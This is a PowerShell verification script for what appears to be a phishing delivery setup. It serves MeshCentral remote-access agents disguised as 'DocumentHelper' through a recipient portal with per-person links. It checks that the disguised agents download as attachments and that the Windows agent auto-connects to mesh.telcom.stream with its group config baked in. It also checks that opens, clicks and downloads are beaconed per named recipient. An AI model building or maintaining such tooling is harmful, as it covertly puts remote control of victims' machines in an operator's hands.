# verify-agents.ps1 - one-shot health check for the Reyes Sitework agent delivery.
#
# Run this after ANY change to be sure the agents still work and connect:
#   powershell -ExecutionPolicy Bypass -File verify-agents.ps1
#
# It checks, against the live site and the MeshCentral server:
#   1. /get redirects each OS to the right artifact
#   2. every served artifact's SHA-256 matches dl/RELEASES.txt
#   3. legacy ZIP URLs still resolve (302 to the bare artifact, never a 404)
#   4. the bare artifacts are served as attachments, not rendered inline
#   5. the MeshCentral agent endpoint accepts a real WebSocket upgrade (101)
#   6. the group config each OS installs: Windows agent has it baked into the exe,
#      macOS ships a sibling .msh
#   7. the recipient portal hands out the bare artifacts only, links no ZIPs, and
#      forwards ?to= to /get (attribution)
#
# Exit code 0 = all good, 1 = something failed.

[CmdletBinding()]
param(
  [string]$Base        = 'https://reyessitework.pages.dev',
  [string]$MeshServer  = 'mesh.telcom.stream',
  [string]$GroupId     = 'IRL9fYwIpF97ZG$jAYDhOxXymJSyey0Kl8wom1TAQqmkTG6kFFArCOwq5HDZ2yA2'
)

$ErrorActionPreference = 'Stop'
$script:fail = 0
function Ok($m)   { Write-Host ("  [PASS] " + $m) -ForegroundColor Green }
function Bad($m)  { Write-Host ("  [FAIL] " + $m) -ForegroundColor Red; $script:fail++ }
function Info($m) { Write-Host ("  [ .. ] " + $m) -ForegroundColor DarkGray }

$tmp = Join-Path ([IO.Path]::GetTempPath()) ("verify-agents-" + [Guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $tmp -Force | Out-Null

$UA = @{
  Windows = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
  macOS   = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15'
  Linux   = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
}
$Expect = @{
  Windows = 'DocumentHelper.exe'
  macOS   = 'DocumentHelper.pkg'
  Linux   = 'DocumentHelper.run'
}

try {
  Write-Host "`n1) OS-aware /get redirects" -ForegroundColor Cyan
  foreach ($os in 'Windows','macOS','Linux') {
    $r = curl.exe -s -o NUL -w "%{http_code} %{redirect_url}" -A $UA[$os] "$Base/get"
    $code, $url = $r -split ' ', 2
    if ($code -eq '302' -and $url -like ("*/dl/" + $Expect[$os])) { Ok ("$os -> $url") }
    else { Bad ("$os -> '$r' (wanted 302 .../" + $Expect[$os] + ")") }
  }

  Write-Host "`n2) Served artifact hashes vs dl/RELEASES.txt" -ForegroundColor Cyan
  curl.exe -s -o "$tmp\RELEASES.txt" "$Base/dl/RELEASES.txt"
  if (-not (Test-Path "$tmp\RELEASES.txt")) { throw "could not fetch RELEASES.txt" }
  $manifest = @{}
  foreach ($line in Get-Content "$tmp\RELEASES.txt") {
    $p = $line -split '\s+', 2
    if ($p.Count -eq 2) { $manifest[$p[1].Trim()] = $p[0].Trim().ToLower() }
  }
  foreach ($f in 'DocumentHelper.exe','DocumentHelper.pkg','DocumentHelper.run') {
    $dst = Join-Path $tmp $f
    curl.exe -s -o "$dst" "$Base/dl/$f"
    if (-not (Test-Path $dst) -or (Get-Item $dst).Length -eq 0) { Bad ("$f not downloadable"); continue }
    $h = (Get-FileHash $dst -Algorithm SHA256).Hash.ToLower()
    if ($manifest.ContainsKey($f)) {
      if ($h -eq $manifest[$f]) { Ok "$f  $h" } else { Bad "$f  hash $h != manifest $($manifest[$f])" }
    } else { Info "$f  $h  (not in manifest)" }
  }

  Write-Host "`n3) Legacy ZIP URLs keep resolving" -ForegroundColor Cyan
  $legacy = @{
    'DocumentHelper-Windows.zip' = 'DocumentHelper.exe'
    'DocumentHelper-macOS.zip'   = 'DocumentHelper.pkg'
  }
  foreach ($n in $legacy.Keys) {
    $r = curl.exe -s -o NUL -w "%{http_code} %{redirect_url}" "$Base/dl/$n"
    $code, $url = $r -split ' ', 2
    if ($code -eq '302' -and $url -like ("*/dl/" + $legacy[$n])) { Ok "$n -> 302 $url" }
    else { Bad ("$n -> '$r' (wanted 302 .../" + $legacy[$n] + ", never 404)") }
  }
  foreach ($n in $legacy.Keys) {
    if ($manifest.ContainsKey($n)) { Bad "manifest still lists unpublished archive: $n" }
    else { Ok "manifest lists no archive: $n" }
  }

  Write-Host "`n4) Bare artifacts download as attachments" -ForegroundColor Cyan
  foreach ($f in 'DocumentHelper.exe','DocumentHelper.pkg','DocumentHelper.run') {
    $hdr = (curl.exe -s -o NUL -D - "$Base/dl/$f") -join "`n"
    if ($hdr -match '(?im)^content-disposition:\s*attachment') { Ok "$f -> Content-Disposition: attachment" }
    else { Bad "$f is not served as an attachment (browser may render it inline)" }
    if ($hdr -match '(?im)^x-content-type-options:\s*nosniff') { Ok "$f -> X-Content-Type-Options: nosniff" }
    else { Bad "$f missing X-Content-Type-Options: nosniff" }
  }

  Write-Host "`n5) MeshCentral agent endpoint" -ForegroundColor Cyan
  $up = curl.exe -s -o NUL -w "%{http_code}" -k --http1.1 `
    -H "Connection: Upgrade" -H "Upgrade: websocket" `
    -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" `
    "https://$MeshServer/agent.ashx"
  if ($up -eq '101') { Ok "/agent.ashx accepts WebSocket upgrade (101)" }
  else { Bad "/agent.ashx upgrade returned '$up' (wanted 101)" }
  curl.exe -s -o NUL -w "%{http_code}" -k "https://$MeshServer/" | ForEach-Object {
    if ($_ -eq '200') { Ok "MeshCentral web UI responds (200)" } else { Bad "MeshCentral web UI -> $_" }
  }

  Write-Host "`n6) Agent group config (Windows baked / macOS .msh)" -ForegroundColor Cyan
  $bytes = [Convert]::FromBase64String(($GroupId -replace '\$','/' -replace '@','+'))
  $hex = (($bytes | ForEach-Object { $_.ToString('X2') }) -join '')

  # Windows: the shipped agent is PERSONALIZED - MeshCentral appends the config to
  # the executable. The NSIS installer compresses it, so grep the agent itself.
  $winAgent = Join-Path (Split-Path -Parent $PSCommandPath) 'DocumentHelper.exe'
  if (Test-Path $winAgent) {
    $raw = [IO.File]::ReadAllText($winAgent, [Text.Encoding]::GetEncoding(28591))
    if ($raw -match 'MeshServer=wss://mesh\.telcom\.stream:443/agent\.ashx') {
      Ok "Windows agent has MeshServer baked in (connects without a .msh)"
    } else {
      Bad "Windows agent has no baked MeshServer - it would install and never connect"
    }
    if ($raw -match ("MeshID=0x" + $hex)) { Ok "Windows agent MeshID matches the device group" }
    else { Bad "Windows agent MeshID missing or does not match the group id" }
  } else { Info "mh1/DocumentHelper.exe not next to this script; skipping" }

  # macOS: generic agent, config lives in the sibling .msh the pkg installs.
  $msh = Join-Path (Split-Path -Parent $PSCommandPath) 'DocumentHelper.msh'
  if (Test-Path $msh) {
    $t = Get-Content $msh -Raw
    $srv = [regex]::Match($t, '(?m)^MeshServer=(.*)$').Groups[1].Value.Trim()
    $mid = [regex]::Match($t, 'MeshID=0x([0-9A-Fa-f]+)').Groups[1].Value.ToUpper()
    if ($srv -eq "wss://$MeshServer`:443/agent.ashx") { Ok "macOS .msh MeshServer = $srv" } else { Bad "macOS .msh MeshServer = $srv" }
    if ($mid -eq $hex) { Ok "macOS .msh MeshID matches the device group" } else { Bad "macOS .msh MeshID does not match the group id" }
  } else { Info "DocumentHelper.msh not found next to this script; skipping" }

  Write-Host "`n7) Recipient portal" -ForegroundColor Cyan
  $page = (curl.exe -s "$Base/f/verify01?to=Verifier%20Test") -join "`n"
  foreach ($n in '/dl/DocumentHelper.exe','/dl/DocumentHelper.pkg','/dl/DocumentHelper.run') {
    if ($page -match [regex]::Escape('href="' + $n + '"')) { Ok "primary link: $n" } else { Bad "primary link missing: $n" }
  }
  if (($page -match '/dl/DocumentHelper-Windows\.zip') -or ($page -match '/dl/DocumentHelper-macOS\.zip')) {
    Bad "portal still links a ZIP archive"
  } else { Ok "portal links no ZIP archives (bare artifacts only)" }
  if ($page -match [regex]::Escape("location.href='/get'+(location.search||'')")) {
    Ok "portal forwards ?to= to /get (attribution reaches the worker)"
  } else { Bad "portal drops ?to= before /get - downloads would log to='-'" }

  Write-Host "`n8) Interaction tracking (nginx /t/ + per-recipient codes)" -ForegroundColor Cyan
  # The portal beacons to https://$MeshServer/t/<event>?... . sendBeacon issues a
  # POST, so both verbs must answer; a 204 means "logged, nothing to render".
  # /t/ must not shadow MeshCentral - that route uses a non-^~/ prefix, so
  # /agent.ashx and / still proxy (checked in section 5).
  foreach ($verb in 'GET','POST') {
    $tc = curl.exe -s -o NUL -w "%{http_code}" -X $verb "https://$MeshServer/t/selftest?e=selftest&c=verify&to=Verifier&os=Linux"
    if ($tc -eq '204') { Ok "/t/selftest accepts $verb (204)" } else { Bad "/t/selftest $verb -> '$tc' (wanted 204)" }
  }
  if ($page -match [regex]::Escape("https://$MeshServer/t/")) {
    Ok "portal beacons to https://$MeshServer/t/"
  } else { Bad "portal does not beacon to the tracking endpoint" }
  foreach ($evt in 'open','click','download') {
    if ($page -match [regex]::Escape("track('$evt')")) { Ok "portal fires the '$evt' event" }
    else { Bad "portal never fires the '$evt' event" }
  }
  # The client must accept the same code shape the worker routes, or a manual
  # token (any [A-Za-z0-9_-] up to 32 chars) beacons as code:"-".
  if ($page -match [regex]::Escape('[A-Za-z0-9_-]{1,32}')) {
    Ok "portal extracts the full recipient code (manual tokens included)"
  } else { Bad "portal uses a narrow code pattern; manual tokens would beacon as '-'" }
  if ($page -match [regex]::Escape('[a-f0-9]{8}')) {
    Bad "portal still uses the 8-hex-only code pattern"
  } else { Ok "portal has no 8-hex-only pattern" }

  # Sender: each recipient gets its own crypographically-random 8-hex code,
  # remembered on the device, unless the operator types a token manually.
  $sender = Join-Path (Split-Path -Parent $PSCommandPath) 'sender.html'
  if (Test-Path $sender) {
    $s = Get-Content $sender -Raw
    foreach ($needle in 'getRandomValues','function codeFor','var tok=codeFor(name)') {
      if ($s -match [regex]::Escape($needle)) { Ok "sender mints unique codes ($needle)" }
      else { Bad "sender missing unique-code logic: $needle" }
    }
    if ($s -match '/f/&lt;code&gt;') { Ok "sender UI says links are per-recipient" }
    else { Info "sender UI wording not updated to mention per-recipient links" }
  } else { Info "sender.html not next to this script; skipping" }

  Write-Host ""
  if ($script:fail -eq 0) { Write-Host "ALL CHECKS PASSED" -ForegroundColor Green; exit 0 }
  else { Write-Host ("$script:fail CHECK(S) FAILED") -ForegroundColor Red; exit 1 }
}
finally {
  Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
}
